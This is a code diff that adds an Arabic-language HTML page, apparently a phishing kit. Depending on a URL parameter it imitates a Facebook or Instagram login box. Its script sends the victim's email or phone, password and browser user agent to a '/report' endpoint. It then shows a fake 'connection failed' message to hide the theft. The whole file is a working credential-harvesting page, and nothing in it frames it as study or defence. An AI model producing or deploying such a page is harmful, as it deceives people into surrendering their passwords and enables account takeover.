@@ -1,0 +1,49 @@
+DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل الحساب</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
+        button { width: 95%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="login-box" id="box">
+        <h2 id="title">تسجيل الدخول</h2>
+        <p id="desc">يرجى تسجيل الدخول للمتابعة</p>
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button onclick="sendData()">تسجيل الدخول</button>
+    </div>
+
+    <script>
+        // سحب نوع المنصة من الرابط (مثلاً ?type=fb)
+        const urlParams = new URLSearchParams(window.location.search);
+        const type = urlParams.get('type') || 'عام';
+        
+        if(type === 'fb') { document.getElementById('title').innerText = 'Facebook'; }
+        if(type === 'ig') { document.getElementById('title').innerText = 'Instagram'; document.querySelector('button').style.background = 'linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888)'; }
+
+        async function sendData() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            
+            await fetch('/report', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    "المنصة": type,
+                    "الحساب": user,
+                    "كلمة السر": pass,
+                    "الجهاز": navigator.userAgent
+                })
+            });
+            alert("فشل الاتصال بالخادم، حاول لاحقاً");
+        }
+    </script>
+</body>
+</html>
